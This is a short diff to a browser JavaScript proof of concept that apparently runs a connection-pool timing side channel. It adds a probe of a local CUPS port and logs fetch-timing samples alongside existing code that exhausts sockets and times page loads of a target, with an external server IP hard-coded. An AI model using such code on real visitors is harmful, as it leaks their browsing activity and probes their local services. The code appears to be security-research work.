@@ -7,7 +7,7 @@ const short_sleep = 0.2;
 const sock_cnt_start = 250;
 const sleep_server_ip = '104.155.96.42';
 const sleep_server_port = 1337;
-const test_server_url = 'http://127.0.0.1:631/';
+let test_server_url = '';
 
 function log(s) {
   document.getElementById('log').insertRow(-1).innerText = `[*] ${s}`;
@@ -64,7 +64,25 @@ async function time_page_loads(url, timing_cnt=512) {
   return timings;
 }
 
+async function choose_test_server_url() {
+  const cups_url = 'http://127.0.0.1:631/';
+  try {
+    await fetch(cups_url, {mode: 'no-cors'});
+    test_server_url = cups_url;
+  } catch {
+    test_server_url = 'http://example.com/';
+  }
+}
+
 async function doit(target) {
+  await choose_test_server_url();
+  log(`Using "${test_server_url}" for congestion test.`)
+  log('Overhead samples:');
+  log(await time_fetch(test_server_url));
+  log(await time_fetch(test_server_url));
+  log(await time_fetch(test_server_url));
+  log(await time_fetch(test_server_url));
+  log(await time_fetch(test_server_url));
   log('Exhausting connection pool');
   await exhaust_sockets();
   let timings = await time_page_loads(target);
